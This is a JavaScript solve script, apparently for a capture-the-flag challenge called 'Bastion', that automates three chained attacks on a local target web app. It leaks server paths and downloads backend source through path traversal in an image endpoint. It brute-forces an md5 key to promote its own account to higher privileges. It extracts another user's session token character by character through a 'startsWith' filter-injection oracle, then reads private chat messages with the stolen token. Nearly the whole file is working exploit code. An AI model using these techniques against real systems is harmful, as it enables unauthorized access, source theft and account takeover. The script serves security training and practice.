// @ts-check
import fetch from 'node-fetch'
import { cpus } from 'os'
import { Worker } from 'worker_threads'

const host = String(process.env.HOST ?? 'http://localhost:3000')
const api = (endpoint) => new URL(`/api/${endpoint}`, host).toString()

const solveFirst = async () => {
  console.log('Creating an account...')
  const name = `bot_${Array.from({ length: 10 })
    .map(() => 'abcdefghijklmonpqrstuvwxyz0123456789'[(Math.random() * 36) | 0])
    .join('')}`
  const displayName = 'Bot'

  // @ts-expect-error
  const { token } = await fetch(api('register'), {
    method: 'POST',
    headers: { 'Content-type': 'application/json' },
    body: JSON.stringify({ name, displayName }),
  }).then((r) => r.json())

  console.log(
    'Account created, name=\x1b[32m%s\x1b[0m and token=\x1b[32m%s\x1b[0m',
    name,
    token,
  )

  console.log('Retrieving bot messages...')

  // @ts-expect-error
  const { messages } = await fetch(api('chat/bastion'), {
    headers: { Cookie: `token=${token}` },
  }).then((r) => r.json())

  const flag = messages
    .map(({ body }) => body)
    .find((body) => body.match(/Current server version/i))
    .replace(/^Current server version: (.+)\.$/i, (match, p1) =>
      Buffer.from(p1, 'base64').toString('utf-8'),
    )

  console.log('First flag found, it is \x1b[32m%s\x1b[0m', flag)

  return { name, token, flag }
}

const solveSecond = async () => {
  console.log('Leaking server paths...')
  // @ts-expect-error
  const { path } = await fetch(
    api('image-generator?name=solve&font=ComicSans'),
  ).then((r) => r.json())
  const root = path.split('/')[1]
  console.log('Server code is located in /\x1b[32m%s\x1b[0m', root)

  console.log('Downloading server code...')
  const code = await fetch(
    api(
      `image?name=../../${root}/apps/backend/build/message/message.service&accept=js`,
    ),
  ).then((r) => r.text())

  const flag = code.replace(
    /^.+Buffer\.from\(message\.body\)\.toString\('base64'\) ===\s+'(.+?)'.+$/s,
    (match, p1) => Buffer.from(p1, 'base64').toString('utf-8'),
  )

  console.log('Second flag found, it is \x1b[32m%s\x1b[0m', flag)

  return { flag }
}

const solveThird = async (name, token) => {
  console.log('Bruteforcing a md5 hash...')
  console.time('md5')

  const key = await new Promise((resolve) => {
    let total = 0
    const n = cpus().length >> 1
    const workers = []
    for (let i = 0; i < n; i++) {
      // @ts-expect-error
      const worker = new Worker(new URL('./worker.js', import.meta.url), {
        workerData: { name, token, prefix: `${i}-` },
      })
      workers.push(worker)
      worker.on('message', async (value) => {
        if (typeof value !== 'object') {
          total += value
          console.log(
            '\x1b[32m%s\x1b[0m hashes computed',
            new Intl.NumberFormat().format(total),
          )
          return
        }
        await Promise.all(workers.map((w) => w.terminate()))
        resolve(value.key)
      })
    }
  })

  console.timeEnd('md5')
  console.log('Hash bruteforced, key=\x1b[32m%s\x1b[0m', key)

  console.log('Promoting account...')
  await fetch(api('promote-user'), {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Cookie: `token=${token}`,
    },
    body: JSON.stringify({ key }),
  })

  console.log("Bruteforcing Bob's token...")
  console.time('token')

  let bobToken = ''
  const abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'
  for (let i = 1; i <= 21; i++) {
    for (let j = 0; j < abc.length; j++) {
      /** @type {array} */ // @ts-expect-error
      const users = await fetch(api('find-users'), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `token=${token}`,
        },
        body: JSON.stringify({
          name: 'bob',
          token: {
            startsWith: `${bobToken}${abc[j]}`,
          },
        }),
      }).then((r) => r.json())
      if (users.length == 1) {
        bobToken += abc[j]
        console.log(
          'Found char #\x1b[32m%s\x1b[0m: \x1b[32m%s\x1b[0m',
          i,
          bobToken,
        )
        break
      }
    }
  }

  console.timeEnd('token')
  console.log("Found Bob's token=\x1b[32m%s\x1b[0m", bobToken)

  // @ts-expect-error
  const { messages } = await fetch(api('chat/alice'), {
    headers: { Cookie: `token=${bobToken}` },
  }).then((r) => r.json())

  const flag = messages
    .map(({ body }) => body)
    .find((body) => body.match(/Yep, it's/i))
    .replace(/^Yep, it's (.+)$/i, (match, p1) => p1)

  console.log('Third flag found, it is \x1b[32m%s\x1b[0m', flag)
  return { flag }
}

const solve = async () => {
  console.log('Attempting to solve Bastion...')
  console.log()
  const { name, token, flag: flag1 } = await solveFirst()
  console.log()
  const { flag: flag2 } = await solveSecond()
  console.log()
  const { flag: flag3 } = await solveThird(name, token)
  console.log()

  return { flag1, flag2, flag3 }
}

if (process.argv.length == 2) solve().then((flags) => console.log(flags))
else if (process.argv.length == 4) solveThird(process.argv[2], process.argv[3])
else console.log('Usage: node index.js [name token]')
